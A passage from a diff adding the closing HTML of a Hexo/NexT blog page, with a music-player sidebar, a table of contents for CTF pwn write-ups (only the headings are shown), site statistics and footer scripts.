+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+      <!-- require APlayer -->
+      <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.css">
+      <script src="https://cdn.jsdelivr.net/npm/aplayer@1.10.1/dist/APlayer.min.js"></script>
+      <!-- require MetingJS-->
+      <script src="https://cdn.jsdelivr.net/npm/meting@2.0.1/dist/Meting.min.js"></script>
+      <meting-js
+        auto="https://y.qq.com/n/yqq/playlist/9454682797.html#stat=y_new.playlist.pic_click">
+      </meting-js>
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#ciscn-2019-es-7"><span class="nav-number">1.</span> <span class="nav-text">ciscn_2019_es_7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF"><span class="nav-number">1.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp"><span class="nav-number">1.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#rootersctf-2019-srop"><span class="nav-number">2.</span> <span class="nav-text">rootersctf_2019_srop</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-1"><span class="nav-number">2.1.</span> <span class="nav-text">思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#exp-1"><span class="nav-number">2.2.</span> <span class="nav-text">exp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#360chunqiu2017-smallest"><span class="nav-number">3.</span> <span class="nav-text">360chunqiu2017_smallest</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%80%9D%E8%B7%AF-2"><span class="nav-number">3.1.</span> <span class="nav-text">思路</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Qwen"
+      src="/images/avatar_2.jpg">
+  <p class="site-author-name" itemprop="name">Qwen</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">59</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">12</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">18</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2025</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Qwen</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+    <span title="站点总字数">280k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">4:14</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+
+
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
